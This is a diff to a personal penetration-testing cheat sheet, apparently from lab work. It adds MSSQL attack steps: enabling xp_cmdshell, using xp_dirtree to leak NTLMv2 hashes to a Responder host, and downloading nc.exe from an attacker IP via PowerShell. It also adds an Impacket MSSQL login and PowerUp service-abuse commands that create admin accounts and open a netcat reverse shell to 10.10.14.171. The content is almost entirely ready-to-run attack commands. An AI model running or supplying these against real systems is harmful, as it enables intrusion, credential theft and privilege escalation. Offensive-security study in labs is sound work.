@@ -102,6 +102,14 @@ SMBcacls
 SCF (Shell Command Files)
   If you can write to a share you can create a SCF file which points an ICONfile to a local share to grab creds with responder.
   https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/
+  
+SQL
+  select @@version
+  enable xp_cmdshell
+  xp_dirtree '\\10.10.14.171\file' (Start responder and catch the NTLMv2)
+  xp_cmdshell "command"
+  Upload File
+    xp_cmdshell "powershell.exe /c IEX (New-Object Net.WebClient).DownloadFile(\"http://10.10.14.171:8000/nc.exe\", \"c:\users\mssql-svc\documents\nc.exe\")"
 
 File Transfer
   Web Server
@@ -118,6 +126,10 @@ NetCat
   
 Responder (Can grab hash when a system is attempting to connect to you over SMB)
   responder -I tun0
+  
+Impacket MSSQL Client
+  python mssqlclient.py -p 1433 reporting:@10.10.10.125 -windows-auth
+  --paste password in
 
 Empire 
   https://null-byte.wonderhowto.com/how-to/use-powershell-empire-getting-started-with-post-exploitation-windows-hosts-0178664/
@@ -133,7 +145,14 @@ Empire
 Hashcat (password cracker)
   hashcat --example-hashes (view example hashes to find the mode)
   Hashcat -m 7400 hashfile.txt /opt/wordlists/rockyou
-  NTLMv2 = 5600  
+  NTLMv2 = 5600 
+  
+PowerUp.ps1
+  Import-Module ./PowerUp.ps1
+  Invoke-ServiceAbuse -Name 'Service Name'
+   - Creates admin john:Password123!
+  Invoke-ServiceAbuse -Name 'Service Name' -command "cmd.exe /K C:\Users\mssql-svc\Documents\nc.exe 10.10.14.171 1234 -e cmd.exe"
+  Invoke-ServiceAbuse -Name 'Service Name' -command "cmd.exe /K net user bob P@ssword /add"
 
 Searchsploit
   searchsploit program-name
